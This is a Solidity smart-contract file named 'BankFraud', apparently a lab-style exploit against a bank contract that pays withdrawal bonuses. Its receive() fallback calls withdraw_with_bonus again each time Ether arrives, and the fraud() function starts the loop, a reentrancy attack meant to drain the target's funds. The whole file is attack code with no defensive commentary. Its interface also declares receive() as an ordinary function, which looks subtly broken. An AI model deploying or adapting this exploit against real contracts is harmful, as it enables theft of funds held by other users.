// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBank {
    function receive() external payable;
    function withdraw_with_bonus() external;
    function giveBonusToUser(address _who) external payable;
}

contract BankFraud {
    IBank public bankContract;

    constructor(address _bankContractAddress) payable {
        bankContract = IBank(_bankContractAddress);
    }

    // Fallback функция
    receive() external payable {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            bankContract.withdraw_with_bonus();
        }
    }

    function sendEtherToBank(address payable bankAddress) public payable {
        (bool sent, ) = bankAddress.call{value: msg.value}("");
        require(sent, "Failed to send ETH");
    }


    function sendBonusToUser(address payable bankAddress) public payable {
        require(address(this).balance >= msg.value, "Not enough ETH on contract balance");

        bytes4 functionSelector = bytes4(keccak256("giveBonusToUser(address)"));
        bytes memory data = abi.encodeWithSelector(functionSelector, address(this));

        (bool sent, ) = bankAddress.call{value: msg.value}(data);
        require(sent, "Failed to send ETH");

        // require(msg.value > 0, "Need to send some ETH for bonus");
        // bankContract.giveBonusToUser{value: msg.value}(address(this));
    }

    function fraud() public {
        bankContract.withdraw_with_bonus();
    }
}
